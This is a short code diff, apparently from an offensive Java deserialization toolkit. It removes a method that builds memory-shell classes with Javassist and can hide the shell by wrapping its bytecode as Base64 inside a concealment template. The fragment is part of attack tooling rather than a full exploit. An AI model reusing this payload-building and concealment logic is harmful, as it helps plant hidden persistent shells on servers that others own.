@@ -4,7 +4,6 @@ import com.qi4l.JYso.gadgets.Config.Config;
 import com.qi4l.JYso.gadgets.utils.Utils;
 import javassist.CtClass;
 import javassist.bytecode.*;
-import org.apache.commons.codec.binary.Base64;
 
 import java.nio.file.Files;
 import java.nio.file.Paths;
@@ -37,44 +36,6 @@ public class GlassHandler {
         }
 
         return null;
-    }
-
-    public static CtClass generateClass(Class<?> clazz, String shellType, String newClassName) throws Exception {
-
-        CtClass ctClass;
-        byte[] byteCodes;
-
-        String exClassName = clazz.getName();
-        ctClass = Config.POOL.get(exClassName);
-
-        // 为 DefineClassFromParameter 添加自定义函数功能
-        ClassFieldHandler.insertFieldIfExists(ctClass, "parameter", "public static String parameter = " + ClassFieldHandler.converString(Config.PARAMETER) + ";");
-
-        // 为类设置新的类名
-        ctClass.setName(newClassName);
-
-        shrinkBytes(ctClass);
-        byteCodes = ctClass.toBytecode();
-
-        if (Config.HIDE_MEMORY_SHELL) {
-            switch (Config.HIDE_MEMORY_SHELL_TYPE) {
-                case 1:
-                    break;
-                case 2:
-                    CtClass newClass = Config.POOL.get("com.qi4l.JYso.template.HideMemShellTemplate");
-                    newClass.setName(ClassNameHandler.generateClassName());
-                    String content = "b64=\"" + Base64.encodeBase64String(byteCodes) + "\";";
-                    String cName = "className=\"" + ctClass.getName() + "\";";
-                    newClass.defrost();
-                    newClass.makeClassInitializer().insertBefore(content);
-                    newClass.makeClassInitializer().insertBefore(cName);
-
-                    ctClass = newClass;
-                    break;
-            }
-        }
-
-        return ctClass;
     }
 
 
